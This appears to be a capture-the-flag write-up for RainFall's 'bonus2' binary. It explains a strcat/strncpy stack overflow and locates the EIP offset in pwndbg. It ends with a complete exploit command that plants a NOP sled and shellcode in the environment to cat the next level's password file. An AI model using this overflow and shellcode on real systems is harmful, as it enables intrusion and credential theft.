# bonus2

This binary takes in two arguments, and outputs "Hello " followed by the first argument. If the environment variable `LANG` starts with "fi" or "nl", instead of "Hello " it will write "Hyvää päivää " or "Goedemiddag! ", respectively.

The `main` function copies 40 bytes from `argv[1]` and 32 bytes from `argv[2]` on the stack. It then sets a `language` to 1 or 2 if LANG starts with fi or nl. After all this, `greetuser` is called.

The `greetuser` allocates a 72 bytes buffer on the stack, and depending on `language`, copies the greeting in it, and then `strcat`'s the string it took as argument in the buffer. Finally, `puts` is called with the buffer.

The main vulnerability lies in the call to `strcat`. We could use it to overflow `greetuser`'s buffer and overwrite `EIP`'s saved value on the stack.

The only problem is, the argument given to `greetuser` comes from an `strncpy` limiting it to 40 bytes, which can't overflow the 72 bytes buffer. Thankfully, `strncpy` isn't safe, and will not write a `\0` if the source is equal or greater to the given size.

And because of how the buffers are located on `main`'s stack, if the first argument is at least 40 bytes long, the second argument will be "concatenated" to the first, making it so that `greetuser`'s argument can be as big as 72 bytes long, with no null terminator. Adding that to the greeting makes it overflow the buffer for sure!

The last issue is that we still cannot overwrite `EIP`, as we are a couple of bytes short. We can overcome this by changing to one of the two other languages, whose greeting are longer than the default English one.

Using a cyclic pattern we find out that with `LANG=fi` we need an offset of 18 bytes on the second argument before overwriting `EIP`'s saved value.

```
pwndbg> cyclic 
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
pwndbg> r aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa

[...]

Program received signal SIGSEGV, Segmentation fault.
0x61666161 in ?? ()

[...]

pwndbg> cyclic -l 0x61666161
Finding cyclic pattern of 4 bytes: b'aafa' (hex: 0x61616661)
Found at offset 18
```

Now all we need to do is add our shellcode into the env, with a nopslide for a change.

By the way, a nopslide is basically a long chain of "non-operations", the simplest one being the `nop` instruction, which literally does nothing. Since the addresses of the env can vary, notably between inside and outide of GDB, having a nopslide means having a large window of addresses which will eventually lead to our shellcode.

```bash
bonus2@RainFall:~$ LANG=fi SHELLCODE=$(python -c 'print "\x90"*1024 + "\x31\xd2\x31\xc0\x52\x68pass\x683//.\x68onus\x68er/b\x68e/us\x68/hom\x89\xe1\x50\x68/cat\x68/bin\x89\xe3\x50\x51\x53\x89\xe1\xb0\x0b\xcd\x80"') gdb ./bonus2 
[...]
(gdb) b main
Breakpoint 1 at 0x804852f
(gdb) r $(python -c 'print "a"*40 + " " + "."*18 + "\xb0\xba\xca\xfe"[::-1]')
Starting program: /home/user/bonus2/bonus2 $(python -c 'print "a"*40 + " " + "."*18 + "\xb0\xba\xca\xfe"[::-1]')

Breakpoint 1, 0x0804852f in main ()
(gdb) x/10s *environ 
0xbffff4cb:	"SHELLCODE=\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220"...
0xbffff593:	"\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220"...
0xbffff65b:	"\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220"...
0xbffff723:	"\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220"...
0xbffff7eb:	"\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220"...
0xbffff8b3:	"\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\061\322\061\300Rhpassh3//.honusher/bhe/ush/hom\211\341Ph/cath/bin\211\343PQS\211\341\260\v\315\200"
0xbffff911:	"SHELL=/bin/bash"
0xbffff921:	"TERM=xterm-256color"
0xbffff935:	"SSH_CLIENT=192.168.56.1 49528 4242"
0xbffff958:	"SSH_TTY=/dev/pts/0"
```

We see here that our `SHELLCODE` environment variable starts at `0xbffff4cb`, and is filled with `nop` (the `\x90` we wrote, that are represented here as `\220`) until a bit after `0xbffff8b3`. Let's select an address in the middle of our nopslide, to account for any shift that might happen in the env: `0xbffff65b`.

Now we can change our placeholder address `0xb0bacafe` with our real target and voilà!

```bash
LANG=fi SHELLCODE=$(python -c 'print "\x90"*1024 + "\x31\xd2\x31\xc0\x52\x68pass\x683//.\x68onus\x68er/b\x68e/us\x68/hom\x89\xe1\x50\x68/cat\x68/bin\x89\xe3\x50\x51\x53\x89\xe1\xb0\x0b\xcd\x80"') ./bonus2 $(python -c 'print "a"*40 + " " + "."*18 + "\xbf\xff\xf6\x5b"[::-1]')
```

Enää yksi jäljellä!